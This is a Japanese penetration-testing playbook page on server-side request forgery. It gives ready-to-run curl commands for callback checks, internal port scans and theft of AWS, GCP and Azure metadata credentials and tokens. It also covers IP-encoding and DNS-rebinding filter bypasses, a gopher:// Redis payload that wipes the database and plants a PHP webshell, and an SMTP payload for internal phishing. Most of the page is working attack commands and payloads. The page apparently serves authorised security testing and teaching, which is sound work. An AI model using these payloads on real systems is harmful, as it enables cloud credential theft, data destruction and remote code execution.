# SSRF（Server-Side Request Forgery）

> **スコープ**: サーバーに任意の URL へ HTTP リクエストを送らせる脆弱性。基本疎通確認〜内部ポートスキャン〜クラウドメタデータ（AWS / GCP / Azure）取得〜フィルタバイパス〜`gopher://` による任意 TCP プロトコル送信までを扱う。取得した認証情報の処理は `../Credential_Discovery.md` を参照。

## 着火条件
- URL を入力するフォームがある（「画像 URL」「Webhook URL」「プロキシ」など）
- パラメータに `url=` / `redirect=` / `target=` / `dest=` が含まれている
- 「外部リソースを取得する」機能がある

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `curl`（標準搭載）/ `python3 -m http.server`（コールバック受信）/ `flask`（302 サーバー）/ `Gopherus`（gopher ペイロード生成。別途 `git clone https://github.com/tarunkant/Gopherus`）
- 外部リソース依存: `nip.io` / `sslip.io`（wildcard DNS）はインターネットアクセス要。オフライン環境では DNS リバインディングサーバーをローカルで建てる

## 先に確認すること

- **コールバック受信準備（§1 の前に）**: テスター側の到達可能インターフェースの IP を `ip a` で確認。詳細 → `../../06_Concepts/Reverse_Shell.md`（攻撃側の準備①）
- **Blind SSRF**: レスポンスが返らなくてもタイミング差 / OOB コールバックでアクセス可否を判断できる
- **IMDSv2 強制環境**: AWS IMDSv2 / GCP `Metadata-Flavor: Google` / Azure `Metadata: true` は各クラウドのヘッダー要求が SSRF 防御として機能している。**アプリ側で任意ヘッダーを attacker 制御可能な経路（URL に含まれるヘッダー注入 / `Headers:` パラメータ受付）が無いと刺さらない**

**攻撃者の思考トレース:** SSRF は「サーバーが自分の代わりにリクエストを投げる」前提で考える。まずコールバック（§1）で疎通確認 → 内部ポートスキャン（§2）→ クラウドメタデータ（§3）→ フィルタがある場合はバイパス（§4）→ gopher で任意プロトコル（§5）の順で試す。

---

## 1. 基本疎通確認（内部アクセス・Blind 確認）

**事前準備（必須）:** テスター側で HTTP コールバック受信サーバーを起動する。

```bash
# [Attacker] コールバック受信
ip a   # テスター側の到達可能インターフェース IP を確認
python3 -m http.server 8000
```

**コマンド:**

```bash
# [Attacker] テスター側へのコールバック確認（Blind SSRF 確認）
curl "http://[TARGET]/fetch?url=http://[ATTACKER_IP]:8000/ssrf_test"

# [Attacker] localhost の内部サービスにアクセス
curl "http://[TARGET]/fetch?url=http://127.0.0.1:8080"
curl "http://[TARGET]/fetch?url=http://localhost/admin"

# [Attacker] 内部ネットワークのスキャン
curl "http://[TARGET]/fetch?url=http://192.0.2.1"
```

**観測される出力 → 次のアクション:**

| 観測される挙動 | 示唆 | 次のアクション |
|-------------|------|------------|
| テスター側 HTTP サーバーにリクエストが届く | SSRF 成立 | §2 内部ポートスキャン / §3 クラウドメタデータへ |
| `http://127.0.0.1:[PORT]/` でポートごとにレスポンスサイズが変わる | 内部ポートスキャン成立 | 開いているポートに対応する内部サービスを特定 |
| リクエストは投げられるがレスポンスが戻らない | Blind SSRF | OOB コールバック確認。タイミング差でアクセス可否判断 |

**注意:** アプリ側が `urllib.parse` 等で 1 回だけパースして最終 URL を決めている場合、`@` を使った `http://trusted.com@127.0.0.1/` 型で騙せることがある。

---

## 2. 内部ポートスキャン

**コマンド:**

```bash
# [Attacker] ポートを変えて内部サービスを探索
for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
  result=$(curl -s -o /dev/null -w "%{http_code} %{size_download}" \
    "http://[TARGET]/fetch?url=http://127.0.0.1:$port/")
  echo "Port $port: $result"
done
```

**観測される出力 → 次のアクション:**

| ポート | 典型的なサービス | 次のアクション |
|--------|----------------|------------|
| 6379 | Redis（認証なしの場合 § 5 gopher で RCE）| §5 gopher 経由でコマンド実行 |
| 9200 | Elasticsearch（認証なし）| インデックス一覧 `_cat/indices?v` を取得 |
| 3306 | MySQL / MariaDB | §5 gopher 経由でのアクセス検討 |
| 8080 / 8443 | 内部管理画面 | レスポンス内容から別の攻撃面を特定 |
| 22 | SSH | `SSH-2.0-OpenSSH_` バナーでバージョン特定 |

---

## 3. クラウドメタデータの取得（AWS / GCP / Azure）

**コマンド:**

```bash
# [Attacker] AWS EC2 (IMDSv1)
curl "http://[TARGET]/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://[TARGET]/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# [Attacker] AWS EC2 (IMDSv2): PUT でトークン取得 → GET にヘッダを付ける 2 段
# 大半の SSRF は GET 固定 + 任意ヘッダ送信不可なため、IMDSv2 強制環境では難易度が一段上がる
curl "http://[TARGET]/fetch?url=http://169.254.169.254/latest/api/token" \
  -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' -X PUT

# [Attacker] GCP: Metadata-Flavor: Google ヘッダ必須（無いと拒否）
curl "http://[TARGET]/fetch?url=http://metadata.google.internal/computeMetadata/v1/" \
  -H 'Metadata-Flavor: Google'
curl "http://[TARGET]/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H 'Metadata-Flavor: Google'

# [Attacker] Azure IMDS: Metadata: true ヘッダ必須 + api-version 必須
curl "http://[TARGET]/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H 'Metadata: true'
# Azure マネージド ID のトークン取得
curl "http://[TARGET]/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H 'Metadata: true'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| AWS: メタデータのパス一覧が返る | IMDSv1 有効 | `iam/security-credentials/[ROLE]` で一時クレデンシャル取得 → `../Credential_Discovery.md` |
| AWS: 401 が返る | IMDSv2 強制 | ヘッダー注入経路（CRLF injection / HTTP スマグリング）を探す |
| GCP: サービスアカウントトークンが返る | GCP クレデンシャル取得 | そのトークンで GCP API を叩く |
| Azure: マネージド ID トークンが返る | Azure クレデンシャル取得 | Azure management API を叩く |

**注意:** AWS IMDSv2 / GCP / Azure のヘッダー要求は SSRF 防御として機能している。「URL を入れると fetch する」だけの単純 SSRF では刺さらないのが大半。CRLF injection 経由のヘッダー注入・proxy が誤って Metadata-Flavor を付与する設定も試す価値はある。

---

## 4. フィルタバイパス系

**コマンド:**

```bash
# [Attacker] IP の別表記（フィルタが ipaddress ライブラリで解析失敗 → 素通り）
# 解析エラーになった後 HTTP クライアントが実際の 127.0.0.1 に届く
http://0177.0.0.1/             # 127.0.0.1 の 8 進数表記
http://0x7f000001/             # 127.0.0.1 の 16 進数表記
http://2130706433/             # 127.0.0.1 の整数表記
http://[::1]/                  # IPv6 の localhost
http://[::ffff:127.0.0.1]/     # IPv4-mapped IPv6（Python 3.11.9 / 3.12.4 未満でのみ通る）

# [Attacker] 公開 wildcard DNS（ホスト名はドメイン外・解決結果は内部 IP）
http://127.0.0.1.nip.io/       # 127.0.0.1 に解決
http://127.0.0.1.sslip.io/     # 同上
http://10.0.0.5.nip.io/        # 内部 RFC1918 アドレスにも展開可能
# ホスト名ベースのブラックリストを抜けつつ実 IP は内部に向かう

# [Attacker] DNS リバインディング（解決のたびに IP が変わる）
# rbndr.us: <hex-ip1>.<hex-ip2>.rbndr.us が交互に 2 つの IP を返す
# Singularity of Origin（OSS）でローカルに rebinding サーバーを建てられる: https://github.com/nccgroup/singularity
```

**観測される出力 → 次のアクション:**

| 観測 | 示唆 | 次のアクション |
|---|---|---|
| `0177.0.0.1` / `0x7f000001` で内部サービスに到達 | IP フィルタが別表記を解析失敗して素通り | そのまま §2 / §3 に繋げる |
| `[::ffff:127.0.0.1]` で通らない | Python 3.11.9+ で loopback 判定が修正済み | 対象の Python バージョンを確認。古い Python なら通る可能性 |
| `nip.io` で通る | ホスト名ベースブラックリストを迂回 | 内部 RFC1918 アドレスを nip.io 形式で試す |
| リダイレクト経由（302 follow）で到達できる | フォロー先の再検証なし | `Open_Redirect.md` §3（302 経由 SSRF）と連動 |

**注意:** `[::ffff:127.0.0.1]` は Python 3.11.9 / 3.12.4 未満でのみ bypass できた古典。対象環境の Python バージョン要件を確認する。DNS リバインディングは①アプリが name → IP 解決 → 検証（外部として通過）→②接続前に再解決 → 内部 IP、の 2 段タイミング差を突く。

---

## 5. `gopher://` による任意 TCP プロトコル送信

`gopher://` スキームを HTTP クライアントが受け入れる環境（古い libcurl・PHP `file_get_contents` / Java `URLConnection` 一部）では、**生の TCP バイトを任意ホスト・任意ポートに送信**できる。HTTP / Redis / SMTP / MySQL の wire protocol を組み立てれば内部サービスへの任意コマンド実行に直結する。

**事前準備（必須）:** Gopherus で gopher ペイロードを生成する。

```bash
# [Attacker] Gopherus で Redis 用 gopher URL を生成
git clone https://github.com/tarunkant/Gopherus
python3 gopherus.py --exploit redis
# → /var/www/html/shell.php に PHP webshell を書く gopher URL を出力
```

**コマンド（手動組み立て例）:**

```bash
# [Attacker] Redis (port 6379) に FLUSHALL + webshell 書込
curl "http://[TARGET]/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aFLUSHALL%0d%0a*3%0d%0a%243%0d%0aSET%0d%0a%241%0d%0a1%0d%0a%2429%0d%0a%0a%0a%3C%3Fphp%20system(%24_GET%5B%27c%27%5D)%3B%20%3F%3E%0a%0a%0d%0a*4%0d%0a%246%0d%0aCONFIG%0d%0a%243%0d%0aSET%0d%0a%243%0d%0adir%0d%0a%2413%0d%0a%2Fvar%2Fwww%2Fhtml%0d%0a*4%0d%0a%246%0d%0aCONFIG%0d%0a%243%0d%0aSET%0d%0a%2410%0d%0adbfilename%0d%0a%249%0d%0ashell.php%0d%0a*1%0d%0a%244%0d%0aSAVE%0d%0a"

# [Attacker] SMTP (port 25) で内部メール送信（内部フィッシング配信）
curl "http://[TARGET]/fetch?url=gopher://127.0.0.1:25/_HELO%20attacker%0d%0aMAIL%20FROM%3A%3Cattacker%40example.test%3E%0d%0aRCPT%20TO%3A%3Cvictim%40example.test%3E%0d%0aDATA%0d%0aSubject%3A%20test%0d%0a%0d%0apwned%0d%0a.%0d%0aQUIT%0d%0a"
```

Gopherus は Redis / MySQL / SMTP / Zabbix / FastCGI / Memcached / PostgreSQL のペイロードに対応している。

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| Redis webshell 書込後 `curl http://[TARGET]/shell.php?c=id` で応答 | RCE 成立 | シェル安定化 → `../../03_Post_Access_Linux/Shell_Stabilization.md` |
| gopher が拒否される | HTTP クライアントが gopher 無効化 | `dict://`（Memcached / Redis に簡易コマンド）/ CRLF injection 経由を検討 |

**注意:** 多くの最新 HTTP クライアントは gopher を無効化済み。`dict://` / `file://` / `ftp://` への切替も試す。`gopher://` が刺さらない場合は `file:///etc/passwd` スキーム切替でエラー文言の変化からスキームホワイトリストを特定する。

---

## 刺さらなかったとき（全体）

| 観測される症状 | 推定原因 | 代替手段 |
|---|---|---|
| `url=http://127.0.0.1` で 400 / 「invalid host」 | ホワイトリスト・スキーム検査が効いている | IP 別表記・リダイレクト経由（§4）|
| `169.254.169.254` で 401 / 403 | IMDSv2 強制 | CRLF injection / HTTP スマグリング経由ヘッダー注入を探す |
| フォロー先 302 でも内部に届かない | リダイレクト先を再検証 | DNS リバインディング（§4）|
| gopher が拒否 | HTTP クライアントが gopher 無効化 | `dict://` / `file://` / CRLF injection |
| Blind SSRF でコールバックが来ない | FW が外向きを遮断 | DNS ルックアップ（53/UDP）経由で疎通確認 |

---

## 注意点・落とし穴

- サーバーが DNS を使ってホスト名を解決する場合、DNS リバインディング攻撃が有効なことがある
- Blind SSRF でもタイミング差でアクセス可否を判断できる
- 失敗パターンの記録: `url=http://127.0.0.1` を素で投げて「invalid host」が返る環境は IP 別表記・リダイレクト経由でないと通らない

> **個別ブロック固有の注意は各 §N の「注意:」を参照。**

---

## 関連技術
- 前：外部 URL を受け付けるパラメータ（`url=` / `redirect=` 等）を発見 → `../../01_Reconnaissance/Web_Enumeration.md`
- 後：内部ポートに到達できた → 対象サービスの脆弱性を調査 → `../../01_Reconnaissance/Network_Scanning.md`
- 後：クラウドメタデータから一時クレデンシャル取得 → `../Credential_Discovery.md`
- 後：プロトコル切替で内部 SMTP 等に到達 → `../Mail_Services.md`
- 関連：パストラバーサルと併発しやすい → `Path_Traversal.md`
- 関連：Blind SSRF のコールバック受信手段 → `../../06_Concepts/Reverse_Shell.md`
- 関連：302 経由 SSRF 防御回避 → `Open_Redirect.md`（§3）
